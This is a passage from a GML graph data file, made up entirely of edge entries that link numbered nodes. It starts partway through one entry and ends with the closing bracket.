    target 22
  ]
  edge [
    source 41
    target 54
  ]
  edge [
    source 41
    target 55
  ]
  edge [
    source 41
    target 56
  ]
  edge [
    source 41
    target 57
  ]
  edge [
    source 41
    target 58
  ]
  edge [
    source 41
    target 59
  ]
  edge [
    source 41
    target 60
  ]
  edge [
    source 41
    target 3
  ]
  edge [
    source 41
    target 61
  ]
  edge [
    source 41
    target 62
  ]
  edge [
    source 41
    target 63
  ]
  edge [
    source 55
    target 48
  ]
  edge [
    source 55
    target 156
  ]
  edge [
    source 55
    target 157
  ]
  edge [
    source 55
    target 158
  ]
  edge [
    source 55
    target 159
  ]
  edge [
    source 64
    target 1
  ]
  edge [
    source 65
    target 66
  ]
  edge [
    source 65
    target 67
  ]
  edge [
    source 65
    target 3
  ]
  edge [
    source 65
    target 68
  ]
  edge [
    source 65
    target 69
  ]
  edge [
    source 65
    target 70
  ]
  edge [
    source 65
    target 71
  ]
  edge [
    source 65
    target 72
  ]
  edge [
    source 65
    target 73
  ]
  edge [
    source 65
    target 74
  ]
  edge [
    source 65
    target 75
  ]
  edge [
    source 65
    target 76
  ]
  edge [
    source 70
    target 173
  ]
  edge [
    source 75
    target 150
  ]
  edge [
    source 77
    target 1
  ]
  edge [
    source 78
    target 44
  ]
  edge [
    source 78
    target 61
  ]
  edge [
    source 78
    target 48
  ]
  edge [
    source 78
    target 79
  ]
  edge [
    source 78
    target 80
  ]
  edge [
    source 78
    target 81
  ]
  edge [
    source 78
    target 82
  ]
  edge [
    source 78
    target 51
  ]
  edge [
    source 78
    target 59
  ]
  edge [
    source 78
    target 83
  ]
  edge [
    source 78
    target 57
  ]
  edge [
    source 78
    target 84
  ]
  edge [
    source 78
    target 50
  ]
  edge [
    source 85
    target 56
  ]
  edge [
    source 85
    target 55
  ]
  edge [
    source 85
    target 86
  ]
  edge [
    source 85
    target 87
  ]
  edge [
    source 85
    target 88
  ]
  edge [
    source 85
    target 53
  ]
  edge [
    source 85
    target 4
  ]
  edge [
    source 85
    target 89
  ]
  edge [
    source 85
    target 90
  ]
  edge [
    source 85
    target 91
  ]
  edge [
    source 85
    target 92
  ]
  edge [
    source 85
    target 3
  ]
  edge [
    source 85
    target 93
  ]
  edge [
    source 85
    target 94
  ]
  edge [
    source 85
    target 78
  ]
  edge [
    source 85
    target 16
  ]
  edge [
    source 85
    target 95
  ]
  edge [
    source 88
    target 156
  ]
  edge [
    source 92
    target 156
  ]
  edge [
    source 96
    target 14
  ]
  edge [
    source 97
    target 53
  ]
  edge [
    source 97
    target 98
  ]
  edge [
    source 99
    target 100
  ]
  edge [
    source 99
    target 14
  ]
  edge [
    source 101
    target 102
  ]
  edge [
    source 101
    target 103
  ]
  edge [
    source 101
    target 29
  ]
  edge [
    source 101
    target 104
  ]
  edge [
    source 101
    target 105
  ]
  edge [
    source 101
    target 106
  ]
  edge [
    source 101
    target 107
  ]
  edge [
    source 101
    target 108
  ]
  edge [
    source 101
    target 109
  ]
  edge [
    source 101
    target 74
  ]
  edge [
    source 101
    target 110
  ]
  edge [
    source 111
    target 112
  ]
  edge [
    source 113
    target 114
  ]
  edge [
    source 113
    target 115
  ]
  edge [
    source 113
    target 116
  ]
  edge [
    source 113
    target 117
  ]
  edge [
    source 118
    target 119
  ]
  edge [
    source 120
    target 121
  ]
  edge [
    source 120
    target 53
  ]
  edge [
    source 120
    target 122
  ]
  edge [
    source 120
    target 123
  ]
  edge [
    source 120
    target 33
  ]
  edge [
    source 120
    target 22
  ]
  edge [
    source 120
    target 124
  ]
  edge [
    source 120
    target 125
  ]
  edge [
    source 120
    target 126
  ]
  edge [
    source 120
    target 127
  ]
  edge [
    source 120
    target 28
  ]
  edge [
    source 121
    target 131
  ]
  edge [
    source 128
    target 129
  ]
  edge [
    source 130
    target 131
  ]
  edge [
    source 132
    target 133
  ]
  edge [
    source 132
    target 49
  ]
  edge [
    source 132
    target 134
  ]
  edge [
    source 132
    target 135
  ]
  edge [
    source 132
    target 43
  ]
  edge [
    source 132
    target 136
  ]
  edge [
    source 132
    target 137
  ]
  edge [
    source 132
    target 138
  ]
  edge [
    source 132
    target 139
  ]
  edge [
    source 132
    target 42
  ]
  edge [
    source 132
    target 140
  ]
  edge [
    source 132
    target 141
  ]
  edge [
    source 132
    target 142
  ]
  edge [
    source 132
    target 143
  ]
  edge [
    source 132
    target 33
  ]
  edge [
    source 132
    target 144
  ]
  edge [
    source 132
    target 145
  ]
  edge [
    source 132
    target 146
  ]
  edge [
    source 132
    target 147
  ]
  edge [
    source 148
    target 132
  ]
  edge [
    source 151
    target 17
  ]
  edge [
    source 151
    target 18
  ]
  edge [
    source 151
    target 152
  ]
  edge [
    source 151
    target 153
  ]
  edge [
    source 151
    target 154
  ]
  edge [
    source 151
    target 155
  ]
  edge [
    source 157
    target 49
  ]
  edge [
    source 157
    target 79
  ]
  edge [
    source 157
    target 38
  ]
  edge [
    source 157
    target 50
  ]
  edge [
    source 157
    target 43
  ]
  edge [
    source 157
    target 167
  ]
  edge [
    source 157
    target 42
  ]
  edge [
    source 158
    target 160
  ]
  edge [
    source 158
    target 143
  ]
  edge [
    source 158
    target 161
  ]
  edge [
    source 158
    target 42
  ]
  edge [
    source 158
    target 162
  ]
  edge [
    source 158
    target 38
  ]
  edge [
    source 158
    target 163
  ]
  edge [
    source 158
    target 164
  ]
  edge [
    source 158
    target 165
  ]
  edge [
    source 158
    target 166
  ]
  edge [
    source 159
    target 38
  ]
  edge [
    source 159
    target 166
  ]
  edge [
    source 163
    target 168
  ]
  edge [
    source 163
    target 50
  ]
  edge [
    source 163
    target 169
  ]
  edge [
    source 163
    target 147
  ]
  edge [
    source 163
    target 49
  ]
  edge [
    source 163
    target 42
  ]
  edge [
    source 163
    target 43
  ]
  edge [
    source 163
    target 170
  ]
  edge [
    source 163
    target 171
  ]
  edge [
    source 163
    target 82
  ]
  edge [
    source 163
    target 172
  ]
  edge [
    source 173
    target 150
  ]
  edge [
    source 174
    target 72
  ]
  edge [
    source 175
    target 42
  ]
  edge [
    source 175
    target 43
  ]
  edge [
    source 175
    target 133
  ]
  edge [
    source 175
    target 49
  ]
  edge [
    source 175
    target 33
  ]
  edge [
    source 175
    target 135
  ]
  edge [
    source 175
    target 144
  ]
  edge [
    source 175
    target 136
  ]
  edge [
    source 175
    target 134
  ]
  edge [
    source 175
    target 137
  ]
  edge [
    source 175
    target 138
  ]
  edge [
    source 175
    target 139
  ]
  edge [
    source 175
    target 141
  ]
  edge [
    source 175
    target 143
  ]
  edge [
    source 175
    target 145
  ]
  edge [
    source 175
    target 140
  ]
  edge [
    source 175
    target 176
  ]
  edge [
    source 175
    target 32
  ]
  edge [
    source 175
    target 146
  ]
  edge [
    source 175
    target 142
  ]
  edge [
    source 175
    target 177
  ]
  edge [
    source 178
    target 175
  ]
  edge [
    source 179
    target 180
  ]
  edge [
    source 181
    target 53
  ]
  edge [
    source 181
    target 93
  ]
  edge [
    source 181
    target 87
  ]
  edge [
    source 182
    target 9
  ]
  edge [
    source 183
    target 53
  ]
  edge [
    source 183
    target 93
  ]
  edge [
    source 183
    target 86
  ]
  edge [
    source 183
    target 87
  ]
  edge [
    source 184
    target 9
  ]
  edge [
    source 184
    target 53
  ]
  edge [
    source 184
    target 11
  ]
  edge [
    source 184
    target 10
  ]
  edge [
    source 185
    target 49
  ]
  edge [
    source 185
    target 79
  ]
  edge [
    source 185
    target 43
  ]
  edge [
    source 185
    target 138
  ]
  edge [
    source 185
    target 186
  ]
  edge [
    source 185
    target 42
  ]
  edge [
    source 185
    target 130
  ]
  edge [
    source 185
    target 149
  ]
  edge [
    source 185
    target 187
  ]
  edge [
    source 185
    target 188
  ]
  edge [
    source 185
    target 189
  ]
  edge [
    source 185
    target 155
  ]
  edge [
    source 185
    target 133
  ]
  edge [
    source 185
    target 190
  ]
  edge [
    source 185
    target 191
  ]
  edge [
    source 185
    target 139
  ]
  edge [
    source 185
    target 192
  ]
  edge [
    source 185
    target 134
  ]
  edge [
    source 185
    target 193
  ]
  edge [
    source 185
    target 113
  ]
  edge [
    source 185
    target 17
  ]
  edge [
    source 185
    target 194
  ]
  edge [
    source 185
    target 140
  ]
  edge [
    source 185
    target 147
  ]
  edge [
    source 185
    target 142
  ]
  edge [
    source 185
    target 19
  ]
  edge [
    source 185
    target 33
  ]
  edge [
    source 185
    target 141
  ]
  edge [
    source 185
    target 195
  ]
  edge [
    source 185
    target 143
  ]
  edge [
    source 185
    target 145
  ]
  edge [
    source 185
    target 18
  ]
  edge [
    source 185
    target 144
  ]
  edge [
    source 185
    target 135
  ]
  edge [
    source 185
    target 136
  ]
  edge [
    source 185
    target 196
  ]
  edge [
    source 185
    target 137
  ]
  edge [
    source 185
    target 15
  ]
  edge [
    source 185
    target 197
  ]
  edge [
    source 185
    target 198
  ]
  edge [
    source 185
    target 146
  ]
  edge [
    source 185
    target 199
  ]
  edge [
    source 185
    target 200
  ]
  edge [
    source 185
    target 201
  ]
  edge [
    source 202
    target 185
  ]
]
